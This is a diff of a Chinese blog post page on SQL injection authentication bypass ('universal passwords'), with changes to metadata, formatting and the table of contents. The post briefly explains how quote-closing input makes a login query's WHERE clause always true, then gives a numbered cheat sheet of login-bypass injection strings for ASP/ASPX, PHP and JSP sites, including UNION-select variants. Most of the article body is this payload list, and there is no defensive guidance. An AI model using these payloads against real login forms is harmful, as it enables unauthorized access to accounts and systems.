@@ -93,7 +93,7 @@
 <meta property="og:site_name" content="abtgu的博客">
 <meta property="og:description" content="漏洞原理 很多网站把用户名和密码放在数据库中，当用户登录网站时，一般采用sql语句查询数据库验证信息。以asp为例 1select * from user where &#39;username&#39; &#x3D;&#39;$username&#39; and &#39;password&#39; &#x3D; &#39;$password&#39; 其中user是数据空中存放用户信息的表，username是存放用户名的字段，password是存放密码的字段。 当用户输入输">
 <meta property="article:published_time" content="2020-03-31T06:13:41.028Z">
-<meta property="article:modified_time" content="2020-03-31T09:48:14.105Z">
+<meta property="article:modified_time" content="2020-03-31T11:46:26.054Z">
 <meta property="article:author" content="abtgu">
 <meta property="article:tag" content="万能密码">
 <meta name="twitter:card" content="summary">
@@ -356,7 +356,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-03-31T17:48:14+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2020-03-31T19:46:26+08:00">
                 2020-03-31
               </time>
             
@@ -417,48 +417,16 @@
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where <span class="string">'username'</span> =<span class="string">'$username'</span> <span class="keyword">and</span> <span class="string">'password'</span> = <span class="string">'$password'</span></span><br></pre></td></tr></table></figure>
 <p>其中user是数据空中存放用户信息的表，username是存放用户名的字段，password是存放密码的字段。<br />
 当用户输入输入 ‘or’’ ='时，sql语句语句就变成了</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where <span class="string">'username'</span> = <span class="string">''</span><span class="keyword">or</span><span class="string">''</span>=<span class="string">''</span> <span class="keyword">and</span> <span class="string">'password'</span> = <span class="string">'$password'</span></span><br><span class="line">```-</span><br><span class="line">由于<span class="string">''</span> = <span class="string">''</span>恒成立，所以where所指条件成立，因而可以绕过身份验证。 </span><br><span class="line">万能密码中开头和结尾的单引号，主要是为了将查询语句中引用变量的单引号闭合，注意此处不能使用双引号，在查询语句中，双引号只能使其中的变量变成字符。</span><br><span class="line"></span><br><span class="line"><span class="comment">## 常用万能密码</span></span><br><span class="line">asp，aspx万能密码</span><br></pre></td></tr></table></figure>
-<p>1：&quot;or “a”=&quot;a<br />
-2：’)or(‘a’=‘a<br />
-3：or 1=1–<br />
-4：‘or 1=1–<br />
-5：a’or’ 1=1–<br />
-6：“or 1=1–<br />
-7：or ‘a’=‘a<br />
-8： &quot;or &quot;=&quot;a’='a<br />
-9：'or”=’’<br />
-10：‘or’=‘or’<br />
-11: 1 or ‘1’=‘1’=1<br />
-12: 1 or ‘1’=‘1’ or 1=1<br />
-13: ‘OR 1=1%00<br />
-14: &quot;or 1=1%00<br />
-15: &quot;xor<br />
-16: 新型万能登陆密码<br />
-用户名’ UNION Select 1,1,1 FROM admin Where &quot;=’ （替换表名admin）<br />
-密码 1<br />
-Username=-1%cf’ union select 1,1,1 as password,1,1,1 %23<br />
-Password=1<br />
-17: admin’ or ‘a’='a 密码随便</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP万能密码</span><br></pre></td></tr></table></figure>
-<p>1: ‘or’=’or’<br />
-2: ‘or 1=1/* 字符型 GPC是否开都可以使用<br />
-3: User: something<br />
-4: Pass: ‘ OR ‘1’=’1</p>
-<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">jsp </span>万能密码</span><br></pre></td></tr></table></figure>
-<p>1: 1’or’1’=’1<br />
-2: admin’ OR 1=1/*<br />
-用户名：admin 系统存在这个用户的时候 才用得上<br />
-密码：1’or’1’=’1</p>
-<pre class="highlight"><code class="">
-
-
-
-
-
-
-
-
-</code></pre>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where <span class="string">'username'</span> = <span class="string">''</span><span class="keyword">or</span><span class="string">''</span>=<span class="string">''</span> <span class="keyword">and</span> <span class="string">'password'</span> = <span class="string">'$password'</span></span><br></pre></td></tr></table></figure>
+<p>由于’’ = ''恒成立，所以where所指条件成立，因而可以绕过身份验证。<br />
+万能密码中开头和结尾的单引号，主要是为了将查询语句中引用变量的单引号闭合，注意此处不能使用双引号，在查询语句中，双引号只能使其中的变量变成字符。</p>
+<h2 id="常用万能密码"><a class="markdownIt-Anchor" href="#常用万能密码"></a> 常用万能密码</h2>
+<p>asp，aspx万能密码</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>：<span class="string">"or "</span>a<span class="string">"="</span>a</span><br><span class="line"><span class="number">2</span>：')or('a'='a</span><br><span class="line"><span class="number">3</span>：or <span class="number">1</span>=<span class="number">1</span>–</span><br><span class="line"><span class="number">4</span>：'or 1=1–</span><br><span class="line">5：a'or' 1=1–</span><br><span class="line">6："or 1=1–</span><br><span class="line">7：or 'a'='a</span><br><span class="line"><span class="number">8</span>： <span class="string">"or "</span>=<span class="string">"a'='a</span></span><br><span class="line"><span class="number">9</span>：'or"=''</span><br><span class="line">10：'or'='or'</span><br><span class="line">11: 1 or '<span class="number">1</span>'='<span class="number">1</span>'=1</span><br><span class="line">12: 1 or '<span class="number">1</span>'='<span class="number">1</span>' or 1=1</span><br><span class="line">13: 'OR <span class="number">1</span>=<span class="number">1</span>%<span class="number">00</span></span><br><span class="line"><span class="number">14</span>: <span class="string">"or 1=1%00</span></span><br><span class="line"><span class="number">15</span>: <span class="string">"xor</span></span><br><span class="line"><span class="number">16</span>: 新型万能登陆密码</span><br><span class="line">用户名' UNION Select 1,1,1 FROM admin Where "=' （替换表名admin）</span><br><span class="line">密码 <span class="number">1</span></span><br><span class="line">Username=-<span class="number">1</span>%cf' union select 1,1,1 as password,1,1,1 %23</span><br><span class="line">Password=1</span><br><span class="line">17: admin' or 'a'='a 密码随便</span><br></pre></td></tr></table></figure>
+<p>PHP万能密码</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">1:</span> <span class="string">‘or’=’or’</span></span><br><span class="line"><span class="attr">2:</span> <span class="string">‘or</span> <span class="number">1</span><span class="string">=1/*</span> <span class="string">字符型</span> <span class="string">GPC是否开都可以使用</span></span><br><span class="line"><span class="attr">3: User:</span> <span class="string">something</span></span><br><span class="line"><span class="attr">4: Pass:</span> <span class="string">‘</span> <span class="string">OR</span> <span class="string">‘1’=’1</span></span><br></pre></td></tr></table></figure>
+<p>jsp 万能密码</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: <span class="number">1</span>’<span class="keyword">or</span>’<span class="number">1</span>’=’<span class="number">1</span></span><br><span class="line"><span class="number">2</span>: admin’ OR <span class="number">1</span>=<span class="number">1</span><span class="comment">/*</span></span><br><span class="line"><span class="comment">用户名：admin 系统存在这个用户的时候 才用得上</span></span><br><span class="line"><span class="comment">密码：1’or’1’=’1</span></span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -749,7 +717,7 @@ var jiathis_config={
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞原理"><span class="nav-text"> 漏洞原理</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞原理"><span class="nav-text"> 漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用万能密码"><span class="nav-text"> 常用万能密码</span></a></li></ol></div>
             
 
           </div>
